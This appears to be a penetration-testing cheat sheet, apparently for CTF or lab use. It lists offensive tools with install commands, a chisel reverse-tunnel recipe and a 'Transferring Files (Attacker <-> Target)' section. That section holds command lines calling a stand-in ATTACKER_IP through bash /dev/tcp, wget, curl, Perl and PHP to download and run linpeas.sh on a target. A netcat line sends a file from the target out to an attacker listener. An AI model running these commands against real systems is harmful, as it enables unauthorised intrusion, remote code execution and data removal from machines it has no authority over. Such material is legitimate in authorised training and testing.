## 🌐 Web & 🖥️ Machine

| Tool | Description | Install / URL |
|------|-------------|--------------------|
| [Burp Suite](https://portswigger.net/burp) | Web proxy | [Community Edition](https://portswigger.net/burp/communitydownload) |
| [sqlmap](https://sqlmap.org/) | SQLi automation | `sudo apt install sqlmap` |
| [ffuf](https://github.com/ffuf/ffuf) | Fuzz URL/files | `go install github.com/ffuf/ffuf@latest` |
| [dirsearch](https://github.com/maurosoria/dirsearch) | Web dir brute-forcer | `git clone` + `pip install -r requirements.txt` |
| [httpx](https://github.com/projectdiscovery/httpx) | Web probing tool | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| [nuclei](https://github.com/projectdiscovery/nuclei) | Vulnerability scanner with templates | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| [XSStrike](https://github.com/s0md3v/XSStrike) | XSS scanner | `git clone` + `pip install -r requirements.txt` |
| [Postman](https://www.postman.com/) | API testing | Download |
| [Cookie-Editor](https://github.com/Moustachauve/cookie-editor) | Cookie manager | Browser extension |
| [nmap](https://nmap.org/) | Network scanner | `sudo apt install nmap` |
| [netcat (nc)](https://man7.org/linux/man-pages/man1/nc.1.html) | Network debugger | `sudo apt install netcat` |
| [socat](http://www.dest-unreach.org/socat/) | Data relay tool | `sudo apt install socat` |
| [linPEAS](https://github.com/carlospolop/PEASS-ng) | Linux privesc audit | `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh` |
| [winPEAS](https://github.com/carlospolop/PEASS-ng) | Windows privesc audit | GitHub release |
| [pwncat](https://github.com/cytopia/pwncat) | Post-exploitation tool | `pip install pwncat` |
| [chisel](https://github.com/jpillora/chisel) | TCP tunnel over HTTP | Precompiled binary |
| [sshuttle](https://github.com/sshuttle/sshuttle) | VPN over SSH | `pip install sshuttle` |
| [Metasploit Framework](https://metasploit.com/) | Exploitation framework | `sudo apt install metasploit-framework` |
| [subfinder](https://github.com/projectdiscovery/subfinder) | Subdomain enumeration | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| [amass](https://github.com/owasp-amass/amass) | Attack surface mapping | `sudo apt install amass` |
| [gobuster](https://github.com/OJ/gobuster) | Directory/DNS brute-forcer | `go install github.com/OJ/gobuster/v3@latest` |
| [wfuzz](https://github.com/xmendez/wfuzz) | Web fuzzer | `sudo apt install wfuzz` |
| [hydra](https://github.com/vanhauser-thc/thc-hydra) | Login brute-forcer | `sudo apt install hydra` |
| [john (John the Ripper)](https://www.openwall.com/john/) | Password cracker | `sudo apt install john` |
| [hashcat](https://hashcat.net/hashcat/) | GPU password cracker | `sudo apt install hashcat` |
| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS poisoner | `git clone` |

## Port Forwarding using `chisel` tool
```
attacker box:
# get chisel in same dir u r
python3 -m http.server 3333
./chisel server -p 8000 --reverse
target box:
cp /tmp
php -r "file_put_contents('chisel', file_get_contents('http://IP:PORT/chisel'));"
chmod +x chisel
./chisel client IP:8000 R:PORTTOFORWARD:IPTOFORWARD:PORTTOFORWARD
```

### 📂 Transferring Files (Attacker <-> Target)

1. Bash /dev/tcp Method (No Tools Required) 
If bash (version 2.04+) is installed and compiled with –enable-net-redirections (standard on most Linux), you can use bash built-ins to open a TCP connection to an attacker's HTTP server. 
Attacker Machine:
```bash
# Serve file from current directory
python3 -m http.server 80
```
Target Machine:
```bash
( exec 3<>/dev/tcp/ATTACKER_IP/80; printf 'GET /linpeas.sh HTTP/1.1\r\nHost: ATTACKER_IP\r\nConnection: close\r\n\r\n' >&3; cat <&3; exec 3<&-; exec 3>&- ) > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
2. Python SimpleHTTPServer (Standard) 
If Python is available on the attacker machine, this is the most common method. 
Attacker Machine:
```bash
python3 -m http.server 80
```
Target Machine (using available tool):
```bash
# Option A: wget
wget http://ATTACKER_IP/linpeas.sh
# Option B: curl
curl http://ATTACKER_IP/linpeas.sh -o linpeas.sh
```
3. Netcat (nc) File Transfer 
If nc is available on the target, it can be used to send binary files directly. 

Attacker Machine (Listener / Sender):
```bash
nc -lvp 4444 > linpeas.sh
```
Target Machine (Receiver):
```bash
nc ATTACKER_IP 4444 < linpeas.sh
```
4. Perl/PHP/Ruby Download
Sometimes languages like Perl, PHP, or Ruby are present when tools like wget are not. 
Perl:
```bash
perl -e 'use LWP::Simple; getstore("http://ATTACKER_IP/linpeas.sh", "linpeas.sh");'
```
PHP:
```bash
php -r '$file = file_get_contents("http://ATTACKER_IP/linpeas.sh"); file_put_contents("linpeas.sh",$file);'
```
6. SSH/SCP
If you have credentials for an SSH service running on the target.
```bash
scp linpeas.sh user@TARGET_IP:/tmp/linpeas.sh
```
